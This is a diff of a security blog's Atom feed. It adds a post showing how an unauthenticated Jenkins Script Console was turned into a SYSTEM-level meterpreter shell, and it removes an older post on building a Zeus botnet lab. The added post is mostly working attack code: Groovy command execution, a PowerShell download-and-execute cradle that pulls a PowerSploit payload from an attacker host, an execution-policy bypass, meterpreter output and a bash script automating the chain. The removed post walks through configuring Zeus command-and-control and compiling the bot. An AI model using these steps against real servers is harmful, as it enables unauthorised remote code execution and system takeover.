@@ -4,7 +4,7 @@
   <title><![CDATA[#!/slash/note]]></title>
   <link href="http://leonjza.github.io/atom.xml" rel="self"/>
   <link href="http://leonjza.github.io/"/>
-  <updated>2015-05-09T12:20:07+02:00</updated>
+  <updated>2015-05-28T19:47:58+02:00</updated>
   <id>http://leonjza.github.io/</id>
   <author>
     <name><![CDATA[Leon Jacobs]]></name>
@@ -12,6 +12,195 @@
   </author>
   <generator uri="http://octopress.org/">Octopress</generator>
 
+  
+  <entry>
+    <title type="html"><![CDATA[jenkins to meterpreter - toying with powersploit]]></title>
+    <link href="http://leonjza.github.io/blog/2015/05/26/jenkins-to-meterpreter-toying-with-powersploit/"/>
+    <updated>2015-05-26T20:40:40+02:00</updated>
+    <id>http://leonjza.github.io/blog/2015/05/26/jenkins-to-meterpreter-toying-with-powersploit</id>
+    <content type="html"><![CDATA[<p><img class="right" src="https://i.imgur.com/DNRQ8Nv.png"></p>
+
+<p>Recently I came across a few <a href="https://jenkins-ci.org/">Jenkins</a> continuous integration servers. A relatively old version I might add but that fact was not important. What was important though was the fact that it was not configured to be <em>&lsquo;secure&rsquo;</em>. Right out of the box Jenkins does not require any authentication to make use of it. In fact, it seems like its almost plug and play.</p>
+
+<!--more-->
+
+
+<h2>groooooooovy</h2>
+
+<p>At first glance I was not too sure about what opportunities I was presented with when finding this. Poking around through the web interface eventually got me to the <em>Script Console</em> that Jenkins provides:</p>
+
+<p><img src="https://i.imgur.com/5X43NOP.png"></p>
+
+<p>This looked promising. <em>&lsquo;Type in an arbitrary Groovy script and execute it on the server.&rsquo;</em> I had zero idea what Groovy Script was so to the le-Googles it was. Some research revealed that it is actually possible to execute commands using it. In fact, the syntax was quite expressive as explained the the <a href="http://www.groovy-lang.org/groovy-dev-kit.html#process-management">documentation</a>.</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class='text'><span class='line'>def process = &quot;ls -l&quot;.execute()
+</span><span class='line'>println &quot;Found text ${process.text}&quot;
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>The documentation goes into enough detail explaining the different options you have to execute commands, but the above snippet was enough to get going. To help with testing, I setup a local instance of the latest Jenkins (v1.615) and ran the Groovy Script. Remember, I was able to do this without any authentication requirement!</p>
+
+<p><img src="https://i.imgur.com/UY83gvp.png"></p>
+
+<p>Nice and easy command execution! :D</p>
+
+<h2>interactive shell, power shell</h2>
+
+<p>Getting an interactive shell on linux based hosts was as simple as picking your favorite flavor of <a href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">reverse shell</a> and moving on from there. On Windows based environments though, the builtin <code>cmd.exe</code> definitely has its limitations. For this reason, reaching out for a meterpreter shell is almost a knee-jerk reaction.</p>
+
+<p>The one Jenkins machine that I had found was running on Windows as <code>nt authority\system</code>, which of course was <em>great</em> news! I figured though that in order to get a meterpreter shell, I&rsquo;d have to approach this in some conventional way of obtaining credentials and launching it with say the metasploit SMB PSExec, or uploading an .exe somehow and executing that. <em>Or&hellip;</em> I could just make use of <code>Invoke-Shellcode.ps1</code> from <a href="https://github.com/mattifestation/PowerSploit">PowerSploit</a> to download and execute one using one command.</p>
+
+<p>Admittedly, I have never actually done this so a little Google-fu and research was needed to get it working right, but eventually this payed off.</p>
+
+<p>In essence, getting the meterpreter shell up required 2 things (apart from the command execution). A <code>payload</code> which includes the <code>Invoke-Shellcode.ps1</code> powershell script together with the meterpreter connection details, and an encoded powershell command to be executed using the command execution we have. Together these will download the hosted payload and prepare the meterpreter. If this sounds a little confusing, don&rsquo;t worry it should be more clear after we have gone through it.</p>
+
+<h2>preparing the payload</h2>
+
+<p>As already mentioned, I was going to use <code>Invoke-Shellcode.ps1</code> from <a href="https://github.com/mattifestation/PowerSploit">PowerSploit</a>. This will go into the payload that needs to be downloaded to bring the meterpreter up. When talking about <em>payload</em> here, all it really is is a file that will be made available via HTTP for the powershell script to download.</p>
+
+<p>The payload will consist of 2 parts. First, defining <code>function Invoke-Shellcode {}</code>, and then invoking the function for a <code>windows/meterpreter/reverse_https</code> shell. Kali Linux has powersploit available in <code>/usr/share</code> so all I really did was cat it to my <code>payload</code> file:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>cat /usr/share/powersploit/CodeExecution/Invoke-Shellcode.ps1 &gt; payload
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>After that, I added the following line to the <code>payload</code> file which will invoke the introduced function and connect the meterpreter. My listener was on 192.168.252.1 on port 443:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost 192.168.252.1 -Lport 443 -Force
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>This file was finally served via HTTP using the python SimpleHTTPServer with <code>python -m SimpleHTTPServer</code> which meant that it would be available at <a href="http://192.168.252.1:8000/payload.">http://192.168.252.1:8000/payload.</a></p>
+
+<h2>preparing the command</h2>
+
+<p>Next, we need to prepare the actual command to run. We will make use of the powershell <a href="https://technet.microsoft.com/en-us/library/hh849893.aspx">Invoke-Expression</a> command and give it a <a href="https://msdn.microsoft.com/en-us/library/ms144200(v=vs.110.aspx">Net.WebClient.DownloadString</a> object to download the payload we previously prepared and execute it.</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class='powershell'><span class='line'><span class="n">iex</span> <span class="p">(</span><span class="nb">New-Object</span> <span class="n">Net</span><span class="p">.</span><span class="n">WebClient</span><span class="p">).</span><span class="n">DownloadString</span><span class="p">(</span><span class="s1">&#39;http://192.168.252.1:8000/payload&#39;</span><span class="p">)</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>That whole command needs to be <a href="http://blogs.msdn.com/b/timid/archive/2014/03/26/powershell-encodedcommand-and-round-trips.aspx">encoded</a> so that, using the command injection, we can run powershell and not worry about escaping and things like that. I found some snippets online to help with this.</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nb">echo</span> <span class="nv">$scriptblock</span> <span class="p">|</span> iconv --to-code UTF-16LE <span class="p">|</span> base64 -w 0
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>The above will output a base64 encoded string that should be passed to the Powershell <code>-Enc</code> flag for execution. The last hurdle to overcome was a potential execution policy. The tl;dr of this is that it can be bypassed by simply passing <code>-Exec ByPass</code> to the powershell executable. So, in summary, the command will be as follows:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class='powershell'><span class='line'><span class="n">cmd</span><span class="p">.</span><span class="n">exe</span> <span class="p">/</span><span class="n">c</span> <span class="n">PowerShell</span><span class="p">.</span><span class="n">exe</span> <span class="n">-Exec</span> <span class="n">ByPass</span> <span class="n">-Nol</span> <span class="n">-Enc</span> <span class="n">aQBlAHgAIAAoAE4</span> <span class="no">[snip]</span> <span class="n">BjBkACcAKQAKAA</span><span class="p">==</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<h2>pwn</h2>
+
+<p>So, I now had the <code>payload</code> file available for download via HTTP, and the command I needed to run. The last thing I had to do was setup a reverse_https listener in metasploit and run the command!</p>
+
+<p><img src="https://i.imgur.com/xBh1Uz9.png"></p>
+
+<p>From the python web server we can see the request come in for the payload:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class='text'><span class='line'>192.168.252.100 - - [28/May/2015 12:37:15] &quot;GET /payload HTTP/1.1&quot; 200 -
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>And pop!</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>msf exploit<span class="o">(</span>handler<span class="o">)</span> &gt; exploit
+</span><span class='line'>
+</span><span class='line'><span class="o">[</span>*<span class="o">]</span> Started HTTPS reverse handler on https://0.0.0.0:443/
+</span><span class='line'><span class="o">[</span>*<span class="o">]</span> Starting the payload handler...
+</span><span class='line'><span class="o">[</span>*<span class="o">]</span> 192.168.252.100:54023 Request received <span class="k">for</span> /INITM...
+</span><span class='line'><span class="o">[</span>*<span class="o">]</span> 192.168.252.100:54023 Staging connection <span class="k">for </span>target /INITM received...
+</span><span class='line'><span class="o">[</span>*<span class="o">]</span> Meterpreter session 1 opened <span class="o">(</span>192.168.252.1:443 -&gt; 192.168.252.100:54023<span class="o">)</span> at 2015-05-28 12:37:17 +0200
+</span><span class='line'>
+</span><span class='line'>meterpreter &gt;
+</span><span class='line'>meterpreter &gt; getuid
+</span><span class='line'>Server username: NT AUTHORITY<span class="se">\S</span>YSTEM
+</span></code></pre></td></tr></table></div></figure>
+
+
+<h2>automation</h2>
+
+<p>While testing this, I slapped together a small script that will prepare the command to run and start the SimpleHTTPServer:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="c">#!/bin/bash</span>
+</span><span class='line'>
+</span><span class='line'><span class="c"># meterpreter ip &amp; port</span>
+</span><span class='line'><span class="nv">lhost</span><span class="o">=</span>192.168.252.1
+</span><span class='line'><span class="nv">lport</span><span class="o">=</span>443
+</span><span class='line'>
+</span><span class='line'><span class="nb">echo</span> <span class="s2">&quot; * Writing Payload&quot;</span>
+</span><span class='line'>cat /usr/share/powersploit/CodeExecution/Invoke-Shellcode.ps1 &gt; payload
+</span><span class='line'><span class="nb">echo</span> <span class="s2">&quot;Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost $lhost -Lport $lport -Force&quot;</span> &gt;&gt; payload
+</span><span class='line'>
+</span><span class='line'><span class="nb">echo</span> <span class="s2">&quot; * Prepping Command&quot;</span>
+</span><span class='line'><span class="nv">scriptblock</span><span class="o">=</span><span class="s2">&quot;iex (New-Object Net.WebClient).DownloadString(&#39;http://$lhost:8000/payload&#39;)&quot;</span>
+</span><span class='line'><span class="nb">echo</span> <span class="nv">$scriptblock</span>
+</span><span class='line'>
+</span><span class='line'><span class="nb">echo</span>
+</span><span class='line'><span class="nb">echo</span> <span class="s2">&quot; * Encoding command&quot;</span>
+</span><span class='line'><span class="nv">encode</span><span class="o">=</span><span class="s2">&quot;`echo $scriptblock | iconv --to-code UTF-16LE | base64 -w 0`&quot;</span>
+</span><span class='line'><span class="nb">echo</span> <span class="nv">$encode</span>
+</span><span class='line'>
+</span><span class='line'><span class="nb">command</span><span class="o">=</span><span class="s2">&quot;cmd.exe /c PowerShell.exe -Exec ByPass -Nol -Enc $encode&quot;</span>
+</span><span class='line'><span class="nb">echo</span>
+</span><span class='line'><span class="nb">echo</span> <span class="s2">&quot; * Final command&quot;</span>
+</span><span class='line'><span class="nb">echo</span> <span class="nv">$command</span>
+</span><span class='line'>
+</span><span class='line'><span class="nb">echo</span>
+</span><span class='line'><span class="nb">echo</span> <span class="s2">&quot; * Starting HTTP Server to serve payload&quot;</span>
+</span><span class='line'>python -m SimpleHTTPServer
+</span></code></pre></td></tr></table></div></figure>
+
+]]></content>
+  </entry>
   
   <entry>
     <title type="html"><![CDATA[playing exploit-exercises - nebula]]></title>
@@ -19653,353 +19842,6 @@ Looking at the server, we see that the message is received:</p>
 
 
 <p>As you can see, flag.txt was found by simply using the locate command for the file. Because I am now root, I have no troubles reading it, and as such, the challenge was considered completed!</p>
-]]></content>
-  </entry>
-  
-  <entry>
-    <title type="html"><![CDATA[Zeus - My Adventure with a Infamous Bot]]></title>
-    <link href="http://leonjza.github.io/blog/2013/09/23/zeus-my-adventure-with-a-infamous-bot/"/>
-    <updated>2013-09-23T14:21:00+02:00</updated>
-    <id>http://leonjza.github.io/blog/2013/09/23/zeus-my-adventure-with-a-infamous-bot</id>
-    <content type="html"><![CDATA[<h6>var disclaimer = require(&lsquo;standard_disclaimer.js&rsquo;);</h6>
-
-<p><strong>NOTE! THIS IS FOR EDUCATIONAL PURPOSES ONLY. CHANCES ARE, IF YOU TRY THIS WITHOUT PERMISSION, YOU WILL GET CAUGHT AND GET THROWN INTO A DARK PLACE WITH NO INTERNET AND A ANGRY NATIVE WITH A BIG STICK &ndash; ALONE</strong></p>
-
-<h3>Bots for the masses.</h3>
-
-<p>Recently at a conference that I attended, I sat in a class that was talking about Botnets and general &lsquo;How Easy They Are&rsquo; related things. 90% of the technical discussions did not really come as a surprise to me, however, I came to realize that I am not <strong>100%</strong> aware of how ( and I dare say this lightly ) <em>easy</em> they have it. The technical competency of the adversary really doesn&rsquo;t have to be at a jaw droppingly high level. In fact, if you can operate the keyboard and mouse, heck, even a tablet/phone once its all setup, then you could potentially be a successful botnet operator.</p>
-
-<!--more-->
-
-
-<h3>So, botnet?</h3>
-
-<p>In its simplest form, a bot, from an attackers perspective, is simply a part of a larger resource network. A number, that if not available, does not really matter as there are many more that form part of the larger botnet. A very well known botnet is the <a href="http://en.wikipedia.org/wiki/Zeus_(Trojan_horse)">Zeus botnet</a>. Popular for its ability to perform credential theft, it was sold from what appears to range from $700 to $15000, depending on the extra <em>features</em> that you&rsquo;d like. Some of these features include the ability to connect via VNC to a remote host in order to graphically control it.</p>
-
-<p>So for $700, you can buy a relatively easy to setup piece of software that would allow you to <em>steal</em> credentials from random victims. This activity is only one part of a larger cybertheft cycle. The wikipedia article <a href="http://en.wikipedia.org/wiki/Zeus_(Trojan_horse)">here</a> does a excellent job to describe the process in a image:</p>
-
-<p><img src="http://upload.wikimedia.org/wikipedia/en/2/2d/FBI_Fraud_Scheme_Zeus_Trojan.jpg"></p>
-
-<h3>The Zeus Bot Architecture</h3>
-
-<p>The Zeus bot client side software is a windows only piece of malware. Typically infection would occur via a <a href="http://en.wikipedia.org/wiki/Drive-by_download">drive-by download</a> (which is the scariest and possibly most stealthy form of infection), or via other means such as facebook posts, phishing sites etc, enticing the user to run an arbitrary executable. Of course, infection is not limited to these methods. Simply getting access to a computer, plugging in your thumbdrive and running the bot software is a completely valid form of infection.</p>
-
-<p>Once infection is successful, the client runs silently on the victim PC, masking itself as much as possible. The client would have a time configured that tells it how often it should update the Command and Control server with new collected information, as well as dynamic configuration updates, new commands it should run and keep-alive check-ins.</p>
-
-<h3>Zeus Source Leaked</h3>
-
-<p>The full Zeus bot sources <a href="https://www.csis.dk/en/csis/blog/3229/">leaked</a> around March 2011, and a Github repo of it was made <a href="https://github.com/Visgean/Zeus">here</a>. This allowed any one in the public to dissect, inspect and test the Malware. This was probably not a good thing for the malware authors&#8217; business :). However, now, anyone is able to grab the sources, modify it as required and use. It leads to the possibility of even more sophistication in a already successful botnet, such as adding peer-to-peer communications with C&amp;C servers instead of relying on HTTP as can be seen in <a href="http://www.cert.pl/PDF/2013-06-p2p-rap_en.pdf">this</a> excellent analysis by <a href="https://twitter.com/CERT_Polska_en">@CERT_Polska_en</a>.</p>
-
-<h3>LAB Time!</h3>
-
-<p>Now that we have the full sources, I decided it&rsquo;s time to setup a LAB to configure and play with this bot.</p>
-
-<p>I have a KVM Server at my disposal, and figured it will be a good idea to use that. The basic idea of the lab was to have a simulated internet network, a firewall, and a client network that makes use of this &ldquo;Fake Internet&rdquo;. I created 2 isolated networks, configured a set of CentOS 6, and Windows XP clients and a Server 2008 R2 Server.</p>
-
-<p>In short, the lab was going to look something like this:</p>
-
-<figure class='code'><figcaption><span>Internal Zeus LAB</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-<span class='line-number'>16</span>
-<span class='line-number'>17</span>
-<span class='line-number'>18</span>
-<span class='line-number'>19</span>
-<span class='line-number'>20</span>
-<span class='line-number'>21</span>
-<span class='line-number'>22</span>
-<span class='line-number'>23</span>
-<span class='line-number'>24</span>
-<span class='line-number'>25</span>
-<span class='line-number'>26</span>
-<span class='line-number'>27</span>
-<span class='line-number'>28</span>
-<span class='line-number'>29</span>
-</pre></td><td class='code'><pre><code class='bash'><span class='line'>                         Virtual Machine Management Interface
-</span><span class='line'>                         +-----------------------------------&gt;
-</span><span class='line'>                                   <span class="p">|</span>
-</span><span class='line'>                                   <span class="p">|</span>
-</span><span class='line'>                                   <span class="p">|</span>
-</span><span class='line'>                              +----+---------+
-</span><span class='line'>                              <span class="p">|</span>              <span class="p">|</span>
-</span><span class='line'>                  +-----------+  Firewall    +-----------+
-</span><span class='line'>                  <span class="p">|</span>           <span class="p">|</span>              <span class="p">|</span>           <span class="p">|</span>
-</span><span class='line'>                  <span class="p">|</span>           +--------------+           <span class="p">|</span>
-</span><span class='line'>                  <span class="p">|</span>                                      <span class="p">|</span>                 +----------+
-</span><span class='line'>                  <span class="p">|</span>                  ^                   <span class="p">|</span>              +--<span class="p">|</span> Victim A <span class="p">|</span>
-</span><span class='line'>          +---------------+          <span class="p">|</span>           +----------------+     <span class="p">|</span>  +----------+
-</span><span class='line'>          <span class="p">|</span>               <span class="p">|</span>          <span class="p">|</span>           <span class="p">|</span>                <span class="p">|</span>     <span class="p">|</span>
-</span><span class='line'>          <span class="p">|</span> Fake Internet <span class="p">|</span>          +           <span class="p">|</span>   Fake LAN     +-----+  +----------+
-</span><span class='line'>          <span class="p">|</span>               <span class="p">|</span>                      <span class="p">|</span>                <span class="p">|</span>     +--+ Victim B <span class="p">|</span>
-</span><span class='line'>          +------+--------+   NAT Towards Fake   +----------------+        +----------+
-</span><span class='line'>                 <span class="p">|</span>            Internet Interface
-</span><span class='line'>                 <span class="p">|</span>
-</span><span class='line'>        +--------+--------+--------------------+----------------+
-</span><span class='line'>        <span class="p">|</span>                 <span class="p">|</span>                    <span class="p">|</span>                <span class="p">|</span>
-</span><span class='line'>        <span class="p">|</span>                 <span class="p">|</span>                    <span class="p">|</span>                <span class="p">|</span>
-</span><span class='line'>        <span class="p">|</span>                 <span class="p">|</span>                    <span class="p">|</span>                +
-</span><span class='line'> +------+-----+     +-----+------+      +------+-------+     +-----------------+
-</span><span class='line'> <span class="p">|</span>            <span class="p">|</span>     <span class="p">|</span>            <span class="p">|</span>      <span class="p">|</span>              <span class="p">|</span>     <span class="p">|</span>                 <span class="p">|</span>
-</span><span class='line'> <span class="p">|</span> Zeus Bot   <span class="p">|</span>     <span class="p">|</span> Zeus Web   <span class="p">|</span>      <span class="p">|</span> Random Victim<span class="p">|</span>     <span class="p">|</span> Compromised     <span class="p">|</span>
-</span><span class='line'> <span class="p">|</span> Herder /   <span class="p">|</span>     <span class="p">|</span> based C<span class="p">&amp;</span>C  <span class="p">|</span>      <span class="p">|</span>              <span class="p">|</span>     <span class="p">|</span> Web Server      <span class="p">|</span>
-</span><span class='line'> <span class="p">|</span> Controller <span class="p">|</span>     <span class="p">|</span>            <span class="p">|</span>      <span class="p">|</span>              <span class="p">|</span>     <span class="p">|</span>                 <span class="p">|</span>
-</span><span class='line'> +------------+     +------------+      +--------------+     +-----------------+
-</span></code></pre></td></tr></table></div></figure>
-
-
-<h3>The Configuration</h3>
-
-<h4>Command &amp; Control</h4>
-
-<p>I figured I&rsquo;d start by checking out the code from the <a href="https://github.com/Visgean/Zeus/">git</a> repo onto the server I would use as the command and control server. So, off I went and <code>git clone https://github.com/Visgean/Zeus.git</code>&rsquo;d the Zeus code into a local directory of my C&amp;C server.</p>
-
-<p>The folder structure of the directory <code>output</code> that is of interest, on disk, looked something like this:</p>
-
-<figure class='code'><figcaption><span>Zeus Sources FOlder Structure</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-</pre></td><td class='code'><pre><code class='bash'><span class='line'>Zeus/output
-</span><span class='line'>├── builder
-</span><span class='line'>├── other
-</span><span class='line'>├── server
-</span><span class='line'>└── server<span class="o">[</span>php<span class="o">]</span>
-</span><span class='line'>    ├── install
-</span><span class='line'>    ├── system
-</span><span class='line'>    └── theme
-</span></code></pre></td></tr></table></div></figure>
-
-
-<p>We can see there is a <code>server[php]</code> directory, which is rather obvious that this is the web interface code. Quick inspection of the sources revealed that the common directory index <code>index.php</code> is in fact empty. So, should someone stumble upon the C&amp;C directory, a blank page will be displayed to the user.</p>
-
-<p>Two other files also exist in the php server root, namely <code>cp.php</code> and <code>gate.php</code>. <code>cp.php</code> is the user control panel to manage the bots, whereas <code>gate.php</code> is the script that all the bots will use to communicate with the C&amp;C. That being said, inspecting network traffic should reveal a lot of talking with <code>gate.php</code>. As a side note, the comments in the sources are in Russian, which makes for a interesting time with Google Translate to read them ;)</p>
-
-<p>So, I copied the sources for <code>server[php]</code> to a web folder <code>z/</code>, fixed up the SELinux contexts for them and tried to access the <code>cp.php</code> page. Bam, server error.</p>
-
-<figure class='code'><figcaption><span>Zeus cp.php mb_internal_encoding error</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="o">[</span>Mon Sep 23 10:57:45 2013<span class="o">]</span> <span class="o">[</span>error<span class="o">]</span> <span class="o">[</span>client 172.16.50.1<span class="o">]</span> PHP Fatal error:  Call to undefined <span class="k">function </span>mb_internal_encoding<span class="o">()</span> in /var/www/html/z/system/global.php on line 1
-</span></code></pre></td></tr></table></div></figure>
-
-
-<p>It was pretty obvious I was missing <code>php-mbstring</code>, so I went and installed it and restarted Apache. Now, loading my <code>cp.php</code>, I was greeted with a polite message asking me how I am :D</p>
-
-<p><img src="http://i.imgur.com/cCgsLBk.png"></p>
-
-<h4>Installing the Command &amp; Control</h4>
-
-<p>I noticed a install folder in the obtained sources and browsed to <code>install/</code> and found a very nice, easy to understand installer:</p>
-
-<p><img src="http://i.imgur.com/e1fYvPG.png"></p>
-
-<p>Here I realized I needed to have a mysql server running, so I proceeded to install that too and create a database <code>cpdb</code> for the control panel. From here, it was literally a case of install and login. We now have a working Zeus command and control server. That really was not so hard was it? In fact, its worryingly easy.</p>
-
-<p><img src="http://i.imgur.com/La5zzZI.png"></p>
-
-<h4>Compiling the Bot</h4>
-
-<p>With that out of the way, the next step had to be to compile the Zeus bot binary with which we will be infecting the Lab of fake LAN clients. For this a Windows machine was required as the tools for this are all windows based. I fired up a Windows XP Virtual Machine, and grabbed a copy of the Zeus code from the Github repository again.</p>
-
-<p>Next, I browsed to the <code>output/builder/</code> folder again and opened the <code>config.txt</code> file in notepad. Here, I really had to set minimal options. One to specify the location of the <code>config.bin</code> and the others for the location of updated bot binaries and what URL the Command and Control server lives at. All pretty straight forward. I also had to set the <code>encryption_key</code>, which should correspond to the key used when we installed the server side PHP stuff earlier.</p>
-
-<p><img src="http://i.imgur.com/xQQeqQl.png"></p>
-
-<p>The next step was to <em>compile</em> the bot. While this may sound complex, it&rsquo;s not. In fact, 2 clicks, granted the config files syntax is correct, and you will have a working compiled exe to work with. The <strong>compiler</strong> interface looked like this:</p>
-
-<p><img src="http://i.imgur.com/f13Baez.png"></p>
-
-<p>1,2,3 done. We now have a <code>zeus-bot.exe</code>. The malware is now customized to speak to my Command &amp; Control server using my unique encryption key. Again, up until this point everything has been pretty easy and straight forward.</p>
-
-<h3>Skipping the creative parts &ndash; Infection.</h3>
-
-<p>From here the infection phase pretty much starts. Of course, the bot herder would need to test hes executables and ensure that they are in working order. There is no point in distributing malware that doesn&rsquo;t work eh. ;D With infection, as previously mentioned anything goes. From drive-by downloads to phishing to physical access to a server. If the machine can execute the bot executable, its job done.</p>
-
-<p>Sadly, I wanted to test the <a href="http://en.wikipedia.org/wiki/Blackhole_exploit_kit">Blackhole Exploit Kit</a>, but the resources on the net appear to be rather scarce. That and the fact that the available versions of it are encoded using a PHP encoder (IonCube), makes it a tad more difficult to get going. It was however interesting to see that the malware authors are limiting they software to IP&rsquo;s along with time restrictions the works. Just like something you&rsquo;d expect to see in commercial software.</p>
-
-<p>As I am kind of the only person using this network, there is no point in trying to fool me into getting the executable run. To make it easy for me to rerun it, I uploaded <code>zeus-bot.exe</code> and the encrypted <code>config.bin</code> to a fake <strong>compromised web server</strong>, ready for download.</p>
-
-<p>I opened Internet Explorer and browsed to the location of <code>zeus-bot.exe</code> and chose <strong>RUN</strong>. To the unsuspecting user, it will appear that nothing happened&hellip;</p>
-
-<h3>From the Bot Herders Perspective</h3>
-
-<p>Assuming the position of the evil bot herder now, I am able to see that I have a new bot connected to my Command &amp; Control server. We can see this in the interface, as well as based on the POST requests to <code>gate.php</code></p>
-
-<figure class='code'><figcaption><span>Apache Logs Extract for POST&#8217;s to gate.php</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-<span class='line-number'>16</span>
-<span class='line-number'>17</span>
-<span class='line-number'>18</span>
-<span class='line-number'>19</span>
-<span class='line-number'>20</span>
-<span class='line-number'>21</span>
-<span class='line-number'>22</span>
-<span class='line-number'>23</span>
-<span class='line-number'>24</span>
-<span class='line-number'>25</span>
-<span class='line-number'>26</span>
-<span class='line-number'>27</span>
-<span class='line-number'>28</span>
-<span class='line-number'>29</span>
-</pre></td><td class='code'><pre><code class='bash'><span class='line'>172.16.50.2 - - <span class="o">[</span>19/Sep/2013:10:58:01 -0400<span class="o">]</span> <span class="s2">&quot;POST /z/gate.php HTTP/1.1&quot;</span> 200 - <span class="s2">&quot;-&quot;</span> <span class="s2">&quot;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)&quot;</span>
-</span><span class='line'>172.16.50.2 - - <span class="o">[</span>19/Sep/2013:10:58:06 -0400<span class="o">]</span> <span class="s2">&quot;POST /z/gate.php HTTP/1.1&quot;</span> 200 - <span class="s2">&quot;-&quot;</span> <span class="s2">&quot;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)&quot;</span>
-</span><span class='line'>172.16.50.2 - - <span class="o">[</span>19/Sep/2013:10:58:12 -0400<span class="o">]</span> <span class="s2">&quot;POST /z/gate.php HTTP/1.1&quot;</span> 200 - <span class="s2">&quot;-&quot;</span> <span class="s2">&quot;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)&quot;</span>
-</span><span class='line'>172.16.50.2 - - <span class="o">[</span>19/Sep/2013:10:58:17 -0400<span class="o">]</span> <span class="s2">&quot;POST /z/gate.php HTTP/1.1&quot;</span> 200 - <span class="s2">&quot;-&quot;</span> <span class="s2">&quot;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)&quot;</span>
-</span><span class='line'>172.16.50.2 - - <span class="o">[</span>19/Sep/2013:10:58:22 -0400<span class="o">]</span> <span class="s2">&quot;POST /z/gate.php HTTP/1.1&quot;</span> 200 - <span class="s2">&quot;-&quot;</span> <span class="s2">&quot;Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)&quot;</span>
